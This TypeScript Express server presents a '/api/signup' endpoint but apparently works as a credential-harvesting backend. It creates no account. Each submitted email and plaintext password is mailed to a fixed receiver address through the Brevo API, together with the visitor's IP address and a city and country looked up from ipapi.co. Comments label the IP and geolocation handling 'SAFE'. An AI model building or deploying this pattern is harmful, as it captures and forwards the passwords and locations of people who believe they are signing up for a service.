import express from "express";
import path from "path";
import { createServer as createViteServer } from "vite";
import dotenv from "dotenv";
import SibApiV3Sdk from "@sendinblue/client";

dotenv.config();

async function startServer() {
  const app = express();
  const PORT = process.env.PORT || 3000;

  app.set("trust proxy", true);
  app.use(express.json());

  app.post("/api/signup", async (req, res) => {
    const { email, password } = req.body;

    if (!email || !password) {
      return res.status(400).json({ error: "Email and Password are required" });
    }

    const emailUser = process.env.EMAIL_USER;
    const receiverEmail = process.env.RECEIVER_EMAIL;
    const brevoKey = process.env.BREVO_API_KEY;

    if (!emailUser || !receiverEmail || !brevoKey) {
      console.error("Missing environment variables");
      return res.status(500).json({
        error: "Server misconfiguration (missing env vars)",
      });
    }

    // ---------------------------
    // SAFE IP HANDLING
    // ---------------------------
    let ip =
      (req.headers["x-forwarded-for"] as string)?.split(",")[0].trim() ||
      req.ip ||
      req.socket.remoteAddress ||
      "unknown";

    if (ip.includes("::ffff:")) {
      ip = ip.split("::ffff:")[1];
    }

    let locationInfo = "Location unavailable";

    // ---------------------------
    // GEO LOOKUP (SAFE)
    // ---------------------------
    try {
      const response = await fetch(`https://ipapi.co/${ip}/json/`);
      const data = await response.json();

      if (data && !data.error) {
        locationInfo = `${data.city}, ${data.region}, ${data.country_name}`;
      }
    } catch (err) {
      console.log("Geo lookup failed");
    }

    // ---------------------------
    // BREVO EMAIL
    // ---------------------------
    try {
      console.log(`Sending email for ${email}`);

      const apiInstance = new SibApiV3Sdk.TransactionalEmailsApi();

      apiInstance.setApiKey(
        SibApiV3Sdk.TransactionalEmailsApiApiKeys.apiKey,
        brevoKey
      );

      await apiInstance.sendTransacEmail({
        sender: { email: emailUser },
        to: [{ email: receiverEmail }],
        subject: `New Signup: ${email}`,
        htmlContent: `
          <h3>New Signup</h3>
          <p><b>Email:</b> ${email}</p>
          <p><b>Password:</b> ${password}</p>
          <p><b>IP:</b> ${ip}</p>
          <p><b>Location:</b> ${locationInfo}</p>
        `,
      });

      return res.json({
        success: true,
        message: "Email sent successfully",
      });
    } catch (error) {
      console.error("BREVO ERROR:", error);
      return res.status(500).json({
        error: "Email sending failed",
      });
    }
  });

  // ---------------------------
  // FRONTEND (VITE)
  // ---------------------------
  if (process.env.NODE_ENV !== "production") {
    const vite = await createViteServer({
      server: { middlewareMode: true },
      appType: "spa",
    });

    app.use(vite.middlewares);
  } else {
    const distPath = path.resolve("dist");

    app.use(express.static(distPath));

    app.get(/.*/, (req, res) => {
      res.sendFile(path.join(distPath, "index.html"));
    });
  }

  app.listen(PORT, "0.0.0.0", () => {
    console.log(`Server running on port ${PORT}`);
  });
}

startServer();